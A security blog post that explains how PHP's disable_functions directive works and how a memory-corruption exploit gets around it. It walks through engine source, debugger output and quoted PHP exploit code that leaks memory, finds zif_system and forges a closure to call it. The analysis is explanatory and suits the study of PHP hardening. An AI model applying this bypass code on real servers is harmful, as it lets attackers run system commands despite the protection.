---
layout: post
title: "From memory corruption to disable_functions bypass: understanding PHP exploits"
date: 2020-02-09 01:13:37
categories: posts
en: true
description: Overview of PHP internals related with disable_functions and how common exploits works
keywords: "RedTeam, Red Team, php, disable_functions, php bypass, exploit, postexplotation, hardening"
authors:
    - X-C3LL
---
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
In a tremendously generic and simplistic way, we can classify disable_functions exploits under two big "labels": or they are related with a call to an external binary (for example the well-known mail() + putenv() exploited by the tool [Chankro](https://github.com/TarlogicSecurity/Chankro), command injections like [shellshock](https://www.exploit-db.com/exploits/35146)/[imap_open()](https://github.com/Bo0oM/PHP_imap_open_exploit/blob/master/exploit.php), etc.) or they are based on memory corruptions. About the first kind of exploits we already talked before in this blog, and even explained [a naive way to discover them automagically](https://x-c3ll.github.io/posts/find-bypass-disable_functions/). So lets focus this time on the second one __:D__

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We are going to dive on this topic with the help of [this exploit](https://raw.githubusercontent.com/mm0r1/exploits/master/php7-backtrace-bypass/exploit.php) from  mm0r1. Instead on focus on the root casue or how the UAF works, our intention is to explain how the bypass is made. The same technique can be translated to similar vulnerabilities.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Our setup is based on a Debian and PHP compiled with debugging symbols:

- PHP 7.2.11 (cli) (built: Oct 24 2018 01:39:46) ( NTS )
- Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Let's begin!

## How disable_functions works
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The first thing we have to clarify is how this directive works. In PHP the functions are classified in two types: "internals" functions (var_dump(), base64_decode(), etc.) and "user" functions  (function blabla($a,$b){...}). Both of them are registered by the engine in a HashTable called __function_table__ and this HashTable is the one used to look up functions when they are called from a PHP script. 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The main code responsible for applying the directive is the following:

```c
ZEND_API int zend_disable_function(char *function_name, size_t function_name_length) 
{
	zend_internal_function *func;
	if ((func = zend_hash_str_find_ptr(CG(function_table), function_name, function_name_length))) {
		zend_free_internal_arg_info(func);
		func->fn_flags &= ~(ZEND_ACC_VARIADIC | ZEND_ACC_HAS_TYPE_HINTS | ZEND_ACC_HAS_RETURN_TYPE);
		func->num_args = 0;
		func->arg_info = NULL;
		func->handler = ZEND_FN(display_disabled_function);
		return SUCCESS;
	}
	return FAILURE;
}
``` 

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The code looks up the function name inside the function_table and changes the original handler to a function called display_disabled_function. As you can imagine, it gives you the classic message:

```c
/* Dummy function which displays an error when a disabled function is called. */
ZEND_API ZEND_COLD ZEND_FUNCTION(display_disabled_function)
{
	zend_error(E_WARNING, "%s() has been disabled for security reasons", get_active_function_name());
}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
So everytime we try to call a function disabled by this directive we are going to call __display_disabled_function__ instead of the desired one __:(__. We can corroborate this behavior using a debugger. To test this put a breakpoint on __zend_disable_function__ and run the binary with `-d 'disable_functions=system' exploit.php`:

```
Breakpoint zend_disable_function
pwndbg> bt
#0  zend_disable_function (function_name=0x555556811aa0 "system", function_name_length=6) at /tmp/php-7.2.11/Zend/zend_API.c:2839
#1  0x0000555555ae6a0b in php_disable_functions () at /tmp/php-7.2.11/main/main.c:229
#2  0x0000555555aeb1d4 in php_module_startup (sf=0x5555566bd9e0 <cli_sapi_module>, additional_modules=0x0, num_additional_modules=0) at /tmp/php-7.2.11/main/main.c:2326
#3  0x0000555555d4e479 in php_cli_startup (sapi_module=0x5555566bd9e0 <cli_sapi_module>) at /tmp/php-7.2.11/sapi/cli/php_cli.c:431
#4  0x0000555555d509d1 in main (argc=4, argv=0x5555566f2890) at /tmp/php-7.2.11/sapi/cli/php_cli.c:1371
#5  0x00007ffff69282e1 in __libc_start_main (main=0x555555d503fb <main>, argc=4, argv=0x7fffffffe4b8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffe4a8) at ../csu/libc-start.c:291
#6  0x0000555555684d3a in _start ()
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can see how the function name declared in the directive (system) is passed as argument to this function. At this point the handler from the function_table is untouched:

```
pwndbg> p *func
$7 = {
  type = 1 '\001',
  arg_flags = "\004\000",
  fn_flags = 256,
  function_name = 0x555556726a90,
  scope = 0x0,
  prototype = 0x0,
  num_args = 2,
  required_num_args = 1,
  arg_info = 0x5555565f80d8 <arginfo_system+24>,
  handler = 0x5555559fa20b <zif_system>,
  module = 0x555556721730,
  reserved = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Lets check the value again just before the return:
```
pwndbg> p *func 
$8 = {
  type = 1 '\001',
  arg_flags = "\004\000",
  fn_flags = 256,
  function_name = 0x555556726a90,
  scope = 0x0,
  prototype = 0x0,
  num_args = 0,
  required_num_args = 1,
  arg_info = 0x0,
  handler = 0x555555baa699 <zif_display_disabled_function>,
  module = 0x555556721730,
  reserved = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
}
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Now the handler field is pointing to the display_disabled_function. If you are wondering why the functions have a "zif_" prefix it is because they are created using the [PHP_FUNCTION macro and it expands to a C symbol with the acronym of "Zend Internal Function"](http://www.phpinternalsbook.com/php7/extensions_design/php_functions.html#registering-php-functions).

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
This tactic prevents the calls to "dangerous" functions inside the script but... zif_system is not erased from the universe. It still existing in the process and we can reach it if we can play with the memory __:)__.

## When the memory corruption comes handy
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The first thing we need is to findthe __zif_system__ location at runtime. For that we need a primitive to leak arbitrary memory contents. The exploit solves this search finding the binary base and then parsing the ELF structures in order to find the target function:

```php
function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Once we have this information the next step is to think in a way to call zif_system. In this exploit an approach based on closures is used. In PHP [anonymous functions are implemented using the Closure class](https://www.php.net/manual/en/functions.anonymous.php). The main structue related to closures is __zend_closure__:

```c
typedef struct _zend_closure {
	zend_object       std;
	zend_function     func;
	zval              this_ptr;
	zend_class_entry *called_scope;
	zif_handler       orig_internal_handler;
} zend_closure;
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Getting deeper inside the func field we can find that exists a handler pointing to the function with the code that will be executed. Indeed, the closure object created by the exploit (the real one) is:

```
pwndbg> p (*(zend_closure *) 0x7ffff38652c0)->func->internal_function
$3 = {
  type = 2 '\002',
  arg_flags = "\000\000",
  fn_flags = 135266304,
  function_name = 0x7ffff3801d70,
  scope = 0x0,
  prototype = 0x7ffff38652c0,
  num_args = 1,
  required_num_args = 1,
  arg_info = 0x7ffff387c0f0,
  handler = 0x7ffff3879068,
  module = 0x2,
  reserved = {0x7ffff3873280, 0x1, 0x7ffff3879070, 0x0, 0x0, 0x0}
}
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
The exploit creates a fake closure object copying the values and changing the type to the value "1" (internal function) and the handle to the zif_system location, so this function will be called instead:

```
pwndbg> p (*(zend_closure *) 0x7ffff38929a8)->func->internal_function
$4 = {
  type = 1 '\001',
  arg_flags = "\000\000",
  fn_flags = 135266304,
  function_name = 0x7ffff3801d70,
  scope = 0x0,
  prototype = 0x7ffff38652c0,
  num_args = 1,
  required_num_args = 1,
  arg_info = 0x7ffff387c0f0,
  handler = 0x5555559fa20b <zif_system>,
  module = 0x2,
  reserved = {0x7ffff3873280, 0x1, 0x7ffff3879070, 0x0, 0x0, 0x0}
}
```

## Conclusions
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
I hope this brief post can be useful to understand how disable_functions works and how the memory corruptions are used in order to achieve a bypass. As long as you can run arbitrary code inside the process you are going to be able to call any function inside the binary. If you find any error or typo, feel free to ping me at twitter ([@TheXC3LL](https://twitter.com/TheXC3LL)) so I can fix it.


